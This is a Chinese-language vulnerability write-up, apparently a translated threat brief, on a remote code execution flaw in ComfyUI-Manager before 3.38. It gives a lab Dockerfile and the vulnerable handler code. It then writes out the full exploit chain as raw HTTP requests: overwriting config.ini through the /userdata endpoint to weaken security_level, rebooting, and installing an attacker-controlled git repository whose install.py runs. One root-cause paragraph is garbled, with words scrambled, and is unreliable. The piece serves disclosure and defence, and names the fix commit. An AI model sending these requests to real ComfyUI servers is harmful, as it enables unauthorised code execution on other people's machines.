#  ComfyUI-Manager远程代码执行分析及概念验证  
 Ots安全   2026-03-24 06:33  
  
**威胁简报**  
  
  
**恶意软件**  
  
  
**漏洞攻击**  
  
**组件概述**  
  
ComfyUI 是一个开源的基于节点的稳定扩散推理框架，它通过 Web 服务器提供 AI 图像生成功能。ComfyUI-Manager 是其配套的扩展管理器，与 ComfyUI 运行在同一进程中，用于安装和管理自定义节点。由于 ComfyUI-Manager 被广泛用作默认管理工具，其安全问题可能会直接影响整个 ComfyUI 实例。  
  
**受影响版本**  
- comfyui-manager [*, 3.38)  
  
**利用前提条件**  
- ComfyUI 启动时需要显式启用远程访问（例如，--listen 0.0.0.0）；否则它只会监听本地主机。  
  
- ComfyUI < v0.3.76 和系统用户保护 API 已禁用（ComfyUI < v0.3.76 默认情况下不启用它）。  
  
**环境设置**  
  
Dockerfile：  
```
FROM python:3.10-slim

WORKDIR /app
RUN apt update && apt install -y git

# ComfyUI
RUN git clone https://github.com/comfyanonymous/ComfyUI.git . \
 && git checkout v0.3.68

# ComfyUI-Manager
RUN git clone https://github.com/ltdrdata/ComfyUI-Manager.git custom_nodes/ComfyUI-Manager \
 && cd custom_nodes/ComfyUI-Manager \
 && git checkout 3.37

RUN pip install --no-cache-dir torch==2.1.2+cpu -f https://download.pytorch.org/whl/torch_stable.html
RUN pip install --no-cache-dir -r requirements.txt

EXPOSE 8188
CMD ["python", "main.py", "--cpu", "--listen", "0.0.0.0"]
```  
  
构建并运行：  
```
docker build -t comfyui-0368-mgr337 .
docker run -p 8188:8188 comfyui-0368-mgr337
```  
  
访问http://127.0.0.1:8188/并点击管理器。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zNsFJyIuL0GBxOHpMwkMA2DtlDcy11ZCsBUtDP3KiaHicWhJAgSyoe9ume4R71Eh2ZcBPjoDeCwia80EGMO8ic3vFLM3M9IdOkYFIzHTTeH6GZk/640?wx_fmt=png&from=appmsg "")  
  
**根本原因分析**  
  
在 ComfyUI v0.3.76 之前的版本中，该/app/user/default目录未受保护，且 ComfyUI 本身没有身份验证机制。攻击者可以利用该/userdata/{file}端点上传并覆盖文件/app/user/default/ComfyUI-Manager/config.ini，从而降低security_level并启用 Manager API，最终导致命令执行。例如，/api/customnode/install/git_url处理程序：  
```
@routes.post("/customnode/install/git_url")
async def install_custom_node_git_url(request):
    if not is_allowed_security_level('high'):
        logging.error(SECURITY_MESSAGE_NORMAL_MINUS)
        return security_403_response()

    url = await request.text()
    res = await core.gitclone_install(url)

    if res.action == 'skip':
        logging.info(f"\nAlready installed: '{res.target}'")
        return web.Response(status=200)
    elif res.result:
        logging.info("\nAfter restarting ComfyUI, please refresh the browser.")
        return web.Response(status=200)

    logging.error(res.msg)
    return web.Response(status=400)
def is_allowed_security_level(level):
    if level == 'block':
        return False
    elif level == 'high':
        if is_local_mode:
            return core.get_config()['security_level'] in ['weak', 'normal-']
        else:
            return core.get_config()['security_level'] == 'weak'
    elif level == 'middle':
        return core.get_config()['security_level'] in ['weak', 'normal', 'normal-']
    else:
        return True
```  
  
is_allowed_security_level('high')只需security_level处于本地模式即可。通过覆盖配置并将从更改为，处理程序会继续执行，从而执行攻击者控制的存储库中的，实现远程代码执行weak( RCE)。normal-security_levelnormalweakcore.gitclone_install(url)install.py  
  
修复提交：https://github.com/Comfy-Org/ComfyUI-Manager/pull/2338/commits/e44c5cef58fb4973670b86433b9d24d077b44a26  
  
该修复程序引入了系统用户保护 API，并将管理器数据目录移动到受保护的路径user/__manager/，从而防止任意上传覆盖配置并阻止此 RCE 路径。  
  
**概念验证**  
  
攻击链：  
```
Unprotected /app/user/default
→ /userdata/{file} overwrites ComfyUI-Manager/config.ini
→ Lower security_level
→ Bypass is_allowed_security_level('high')
→ Call core.gitclone_install(url)
→ Execute remote install.py
→ RCE
```  
  
1.config.ini通过 ComfyUI API读取GET /userdata/{file}：  
```
GET /userdata/ComfyUI-Manager%2Fconfig.ini HTTP/1.1
Host: 127.0.0.1:8188
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Connection: close
Cache-Control: max-age=0
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zNsFJyIuL0Htz3l8ibxXdn28qP9hdoVRF0V3kH9knNicFebNY66dXcQXls3L7MaMMx6pVdtEVvOg4P2CL2mBKHmb4W6YiciaRoNga6283gXJxEg/640?wx_fmt=png&from=appmsg "")  
  
2.ComfyUI-Manager/config.ini通过以下方式覆盖POST /userdata/...并设置security_level为weak：  
```
POST /userdata/ComfyUI-Manager%2Fconfig.ini HTTP/1.1
Host: 127.0.0.1:8188
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 453

[default]
preview_method = none
git_exe = 
use_uv = True
channel_url = https://raw.githubusercontent.com/ltdrdata/ComfyUI-Manager/main
share_option = all
bypass_ssl = False
file_logging = True
component_policy = workflow
update_policy = stable-comfyui
windows_selector_event_loop_policy = False
model_download_by_agent = False
downgrade_blacklist = 
security_level = weak
always_lazy_install = False
network_mode = public
db_mode = cache
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zNsFJyIuL0Ec5eE4PuXUVTo0L2s8FH46UWUCkbwZP14SyYQ2pSRVXtXD8kKpB1N3n5nX3sneXSXCfxtedEiaJV6tc728bSrRYgFFibjDqnIdM/640?wx_fmt=png&from=appmsg "")  
  
配置已成功覆盖：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zNsFJyIuL0FDsE9pI4CORjVRcOQPXJAJfuO3oB7cOMdzx6hGuWX38Pw9bBg4zjTkdLxHWIr5m7xV9a6seSBP6FaMQ6DH9siaW9ibAqMibhImso/640?wx_fmt=png&from=appmsg "")  
  
3.重启以应用配置，然后触发管理器 API 加载攻击者控制的存储库并执行install.py：  
```
GET /api/manager/reboot HTTP/1.1
Host: 127.0.0.1:8188
Cache-Control: max-age=0
sec-ch-ua-platform: "Windows"
Comfy-User: 
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
sec-ch-ua-mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8188/
Accept-Encoding: gzip, deflate, br
Cookie: lang=zh-CN; prefsHttp={}; tenantId=default
Connection: keep-alive
```  
  
创建一个包含恶意代码的远程GitHub仓库：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zNsFJyIuL0HJUGQIS6GdwIBNVpyia5KQ2C4I5yUTibIP9fpP9La3vK65eu62ib7Um5g3NCmibVWu5rTibQAcWmhTuicjDoZgm3s2wNM1nneqXSvyE/640?wx_fmt=png&from=appmsg "")  
  
加载并执行恶意代码库：  
```
POST /api/customnode/install/git_url HTTP/1.1
Host: 127.0.0.1:8188
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: text/plain;charset=UTF-8
Content-Length: 55

https://github.com/xxxx/xxxx-Test.git
```  
  
命令执行成功，并写入文件：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zNsFJyIuL0FwM2xpFl3sy5AXfBpjcvnsOVH1PMiazicoNMtFmzKppBn6TRQIuJKYVa4D6uz1YGW3Dn7Py4LEQ5okRrDR1iacJV1SddZ4c0eEyQ/640?wx_fmt=png&from=appmsg "")  
  
  
**END**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zNsFJyIuL0EEevHKzic0EFCibQwibEGmS05FOvLppI3gR979xP2vPMxaVeqFwvst7KEjatwluTzuM3audyllEvVv5dfQeUbYhicS6aEpXo3q1yo/640?wx_fmt=jpeg&from=appmsg "")  
  
  
公众号内容都来自国外平台-所有文章可通过点击阅读原文到达原文地址或参考地址  
  
排版 编辑 | Ots 小安   
  
采集 翻译 | Ots Ai牛马  
  
公众号 |   
AnQuan7 (Ots安全)  
  
